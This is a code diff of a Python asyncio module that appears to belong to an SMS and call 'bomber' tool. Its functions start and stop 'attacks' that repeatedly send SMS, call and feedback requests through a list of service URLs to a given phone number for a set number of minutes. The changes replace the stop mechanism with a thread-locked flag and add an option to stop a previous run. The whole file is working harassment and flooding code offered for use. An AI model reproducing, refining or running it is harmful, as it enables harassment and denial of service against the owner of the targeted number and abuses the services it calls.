@@ -1,18 +1,27 @@
-from asyncio import ensure_future, gather, run, Event
+from asyncio import ensure_future, gather, run
 from aiohttp import ClientSession
 
 from Core.Attack.Services import urls
-from Core.Attack.Feedback_Services import feedback_urls
 
-# Глобальный флаг для остановки атак
-stop_event = Event()
+# Флаг остановки (threading-safe)
+import threading
+_stop_lock = threading.Lock()
+_stop_flag = False
+
+def _is_stopped():
+    with _stop_lock:
+        return _stop_flag
+
+def _set_stopped(val=True):
+    global _stop_flag
+    with _stop_lock:
+        _stop_flag = val
 
 async def request(session, url, attack_type):
     try:
-        if stop_event.is_set():
+        if _is_stopped():
             return
 
-        # Определяем какие типы запросов шлём
         if attack_type == "MIX":
             allowed = ("SMS", "CALL", "FEEDBACK")
         elif attack_type == "SMS":
@@ -39,16 +48,20 @@ async def request(session, url, attack_type):
 
 async def async_attacks(number, attack_type):
     async with ClientSession() as session:
-        services = urls(number)  # SMS + CALL
+        services = urls(number)
         tasks = [ensure_future(request(session, s, attack_type)) for s in services]
         await gather(*tasks)
 
-def start_async_attacks(number, minutes, attack_type="MIX"):
+def start_async_attacks(number, minutes, attack_type="MIX", stop_previous=False):
     import time
+    if stop_previous:
+        # Даём время старому потоку заметить остановку
+        time.sleep(0.5)
+        _set_stopped(False)
     start_time = time.time()
     duration = float(minutes) * 60
     while True:
-        if stop_event.is_set():
+        if _is_stopped():
             break
         elapsed = time.time() - start_time
         if elapsed >= duration:
@@ -56,4 +69,4 @@ def start_async_attacks(number, minutes, attack_type="MIX"):
         run(async_attacks(number, attack_type))
 
 def stop_attacks():
-    stop_event.set()
+    _set_stopped(True)
